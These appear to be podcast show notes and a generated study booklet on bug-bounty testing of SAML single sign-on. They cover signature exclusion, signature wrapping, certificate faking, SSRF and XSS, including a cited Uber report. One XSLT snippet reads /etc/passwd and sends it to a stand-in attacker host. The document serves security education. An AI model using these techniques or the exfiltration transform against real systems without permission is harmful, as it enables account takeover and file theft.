---
title: "The SAML Ramble"
episode: 46
---


# Episode 46 The SAML Ramble

### TL;DR
- Solo Justin episode on SAML (Security Assertion Markup Language) testing methodology
- Based on ep052's SAML testing blog series (2019) and GreenDog's "How to Break SAML" talk
- Eight categories of SAML attacks explained
- SAML + XSS correlation is strong — older technology, more error reflection

### Key takeaways
- SAML is XML-based; every organization using SSO has SAML parsers in multiple languages — there WILL be parsing inconsistencies
- Test every SAML endpoint for XSS in the SAMLRequest/SAMLResponse parameters
- Signature Exclusion: remove the `<ds:Signature>` tags entirely — if the SP accepts it, you can modify assertions at will
- XML Signature Wrapping: 8 different placements of assertions/signatures to trick the parser into accepting unsigned assertions
- Certificate Faking: the SP may use an embedded X.509 certificate from the SAML response itself to validate the signature — forge your own cert
- XSLT Transformations: processed BEFORE signature validation, and XSLT is Turing-complete — can read files and exfiltrate

### Bugs and Findings
#### SAML Signature Exclusion (OneLogin WordPress Plugin — Uber)
- **Target:** `newsroom.uber.com` using OneLogin SAML SSO (WordPress plugin)
- **Technique:** Sent a bare SAML response with no signature tags; server responded with "missing attribute" errors — enumerated required attributes, then crafted a response with all attributes filled and no signature → logged in as any user
- **Key technical details:** No `<ds:Signature>` needed; just assertion attributes
- **Report:** HackerOne #136169

#### SAML Response XSS
- **Target:** Private program
- **Technique:** Modified the `Destination` attribute of the `<samlp:Response>` tag to include an XSS payload (HTML-encoded since it's XML attribute context); server reflected the error in text/html → XSS
- **Key technical details:** Attributes in XML need HTML encoding (`&lt;` `&gt;`) for `<>` characters; server reflects the raw value in an error page

### Techniques and Primitives
- **Signature Exclusion** — delete signature tags, modify assertions, re-encode
- **XML Signature Wrapping** — 8 variants of placing signature/assertion in different relative positions
- **Certificate Faking via KeyInfo** — include self-signed cert in SAML response
- **XSLT Transform** — `<xsl:template match="/">` to read files and exfiltrate via HTTP:
  ```
  <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
  <xsl:variable name="encoded" select="encode-for-uri($file)"/>
  <xsl:value-of select="document(concat('http://attacker.com/',$encoded))"/>
  ```
- **SSRF via x509 Certificate Authority Info Access (AIA) extension** — cert contains a URL to the issuer; validator fetches it → SSRF
- **Token Recipient Confusion** — use assertion from App A on App B if both use the same IDP

### Tooling and Resources
- **SAMLRaider** (Burp extension) — automates all eight signature wrapping attacks
- **ep052's SAML Testing Methodology** blog series (3 parts)
- **GreenDog's "How to Break SAML"** and "Weird Proxies" repo
- **Michael Stepankin's x509 SSRF research** (Black Hat 2023)

### AI Takeaway
XSLT transforms in SAML are the most dangerous because they execute BEFORE signature validation. A Turing-complete language that can read arbitrary files and make HTTP requests, processed before the cryptographic integrity check, is a backdoor by design.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Solo Justin episode on SAML (Security Assertion Markup Language) testing methodology

#### 2. What you should learn
- Understand **saml is xml-based; every organization using sso has saml parsers in multiple languages — there will be parsing inconsistencies**
- Understand **test every saml endpoint for xss in the samlrequest/samlresponse parameters**
- Understand **signature exclusion: remove the `<ds:signature>` tags entirely — if the sp accepts it, you can modify assertions at will**
- Understand **xml signature wrapping: 8 different placements of assertions/signatures to trick the parser into accepting unsigned assertions**
- Understand **certificate faking: the sp may use an embedded x.509 certificate from the saml response itself to validate the signature — forge your own cert**

#### 3. Core concepts explained
**SAML Signature Exclusion (OneLogin WordPress Plugin — Uber)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**SAML Response XSS**
- **What it is:** Cross-Site Scripting — injecting malicious JavaScript that runs in a victim's browser session, allowing session theft, phishing, or further attacks.
- **Why it matters:** XSS remains one of the most common and impactful web vulnerabilities. Stored XSS can affect every user who views the page.
- **Common mistake:** Focusing only on reflected XSS and missing stored XSS in profile fields, file uploads, or message boards.

**Signature Exclusion**
- delete signature tags, modify assertions, re-encode

**XML Signature Wrapping**
- 8 variants of placing signature/assertion in different relative positions

**Certificate Faking via KeyInfo**
- include self-signed cert in SAML response


#### 4. Techniques and tactics
**Signature Exclusion**
- **What it is:** delete signature tags, modify assertions, re-encode
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**XML Signature Wrapping**
- **What it is:** 8 variants of placing signature/assertion in different relative positions
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Certificate Faking via KeyInfo**
- **What it is:** include self-signed cert in SAML response
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**XSLT Transform**
- **What it is:** `<xsl:template match="/">` to read files and exfiltrate via HTTP:
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**SSRF via x509 Certificate Authority Info Access (AIA) extension**
- **What it is:** cert contains a URL to the issuer; validator fetches it → SSRF
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"The best bugs come from persistence and deep understanding of the target"*
- *"Always think about what the worst thing that could happen is"*
- *"Don't be afraid to spend time on a single target"*

#### 6. Mental models
- **Think like an attacker** — Always consider the worst-case impact of a vulnerability. What would a malicious actor do with this access?
- **Persistence pays off** — The best bugs often come from spending deep time on a single target rather than skimming many targets.
- **Follow the data** — Track how user input flows through the application. Sources (inputs) lead to sinks (dangerous operations).

#### 7. Real-world application
- **Try this:** SAML is XML-based; every organization using SSO has SAML parsers in multiple languages — there WILL be parsing inconsistencies
- **Try this:** Test every SAML endpoint for XSS in the SAMLRequest/SAMLResponse parameters
- **Try this:** Signature Exclusion: remove the `<ds:Signature>` tags entirely — if the SP accepts it, you can modify assertions at will
- **Try this:** XML Signature Wrapping: 8 different placements of assertions/signatures to trick the parser into accepting unsigned assertions

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **SSRF** — Server-Side Request Forgery — server makes HTTP requests on attacker's behalf
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in SAML Signature Exclusion (OneLogin WordPress Plugin — Uber)?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Solo Justin episode on SAML (Security Assertion Markup Language) testing methodo**
2. **SAML is XML-based; every organization using SSO has SAML parsers in multiple lan**
3. **Test every SAML endpoint for XSS in the SAMLRequest/SAMLResponse parameters**
